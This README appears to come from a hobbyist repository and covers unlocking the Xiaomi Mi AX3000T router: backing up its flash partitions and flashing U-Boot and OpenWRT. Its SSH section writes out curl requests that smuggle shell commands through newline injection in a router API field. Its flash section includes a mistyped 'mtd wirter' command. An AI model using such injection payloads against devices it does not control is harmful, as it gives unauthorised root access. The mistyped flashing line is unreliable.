# Mi_AX3000T

## 文件清单

| 文件                                                                           | 作用                        |
| ------------------------------------------------------------------------------ | --------------------------- |
| [miwifi_rd03_firmware_ef0ee_1.0.47.bin](miwifi_rd03_firmware_ef0ee_1.0.47.bin) | Mi_AX3000T官方固件1.0.47    |
| [ax3000t_1.0.49.bin](ax3000t_1.0.49.bin)                                       | Mi_AX3000T固件1.0.49        |
| [miwifi_rd03_firmware_14680_1.0.64.bin](miwifi_rd03_firmware_14680_1.0.64.bin) | Mi_AX3000T固件1.0.64        |
| [Xioami](xiaomi/)                                                              | Mi_AX3000T官方备份          |
| [FIP.bin](FIP.bin)                                                             | Mi_AX3000T官方UBoot分区备份 |

## Enable SSH(开启SSH)

开启SSH使用了一个注入漏洞,根据OpenWRT Wiki描述,仅在官方固件中的1.0.47版本中生效,如果版本过高,可以降级开启,或者小米路由器官方救砖工具降级

```shell
curl -X POST http://192.168.31.1/cgi-bin/luci/;stok=<Stok>/api/misystem/arn_switch -d "open=1&model=1&level=%0Anvram%20set%20ssh_en%3D1%0A"

curl -X POST http://192.168.31.1/cgi-bin/luci/;stok=<Stok>/api/misystem/arn_switch -d "open=1&model=1&level=%0Anvram%20commit%0A"

curl -X POST http://192.168.31.1/cgi-bin/luci/;stok=<Stok>/api/misystem/arn_switch -d "open=1&model=1&level=%0Ased%20-i%20's%2Fchannel%3D.*%2Fchannel%3D%22debug%22%2Fg'%20%2Fetc%2Finit.d%2Fdropbear%0A"

curl -X POST http://192.168.31.1/cgi-bin/luci/;stok=<Stok>/api/misystem/arn_switch -d "open=1&model=1&level=%0A%2Fetc%2Finit.d%2Fdropbear%20start%0A"
```

## Backup Partition(备份分区)

```shell
dd if=/dev/mtd0 | gzip >/tmp/spi.bin.gz
dd if=/dev/mtd1 | gzip >/tmp/BL2.bin.gz
dd if=/dev/mtd2 | gzip >/tmp/Nvram.bin.gz
dd if=/dev/mtd3 | gzip >/tmp/Bdata.bin.gz
dd if=/dev/mtd4 | gzip >/tmp/Factory.bin.gz
dd if=/dev/mtd5 | gzip >/tmp/FIP.bin.gz
dd if=/dev/mtd6 | gzip >/tmp/crash.bin.gz
dd if=/dev/mtd7 | gzip >/tmp/crash_log.bin.gz
dd if=/dev/mtd8 | gzip >/tmp/ubi.bin.gz
dd if=/dev/mtd9 | gzip >/tmp/ubi1.bin.gz
dd if=/dev/mtd10 | gzip >/tmp/overlay.bin.gz
dd if=/dev/mtd11 | gzip >/tmp/data.bin.gz
dd if=/dev/mtd12 | gzip >/tmp/KF.bin.gz
```

在备份完成后可以使用Scp命令或者SSH工具导出备份

[恢复文件下载](xiaomi/),恢复文件时的管理员密码为`adminadmin`,若不能登陆也可尝试重置

恢复分区

```shell
# 还原UBoot分区示例,其中 /tmp/FIP.bin是UBoot分区备份文件路径,/dev/mtd5是分区路径
mtd write /tmp/FIP.bin /dev/mtd5
```

一共13个分区,其中Bdata中包含Mac地址信息,在Mac地址丢失时尝试使用命令重刷该分区`/dev/mtd3`

FIP分区,位于/dev/mtd5,该分区为UBoot分区,还原官方UBoot可以使用备份文件还原该分区

ubi分区,位于/dev/mtd8,还原官方固件时需要使用备份文件刷写该分区,可能是系统分区

## Flash UBoot

地址:[UBoot](https://github.com/hanwckf/bl-mt798x)

```shell
mtd wirter /tmp/UBoot.bin /dev/mtd5
```

## Flash OpenWRT

进入UBoot:按压Reset同时接通电源,PC使用网络线缆连接路由器,配置连接的网络适配器IP地址为192.168.1.x,如果不行则尝试192.168.31.x网段

UBoot中选择布局为QWRT,选择[OpenWRT固件](openwrt-R23.11.11-mt7981-xiaomi_mi-router-ax3000t-squashfs-factory.bin)即可刷写
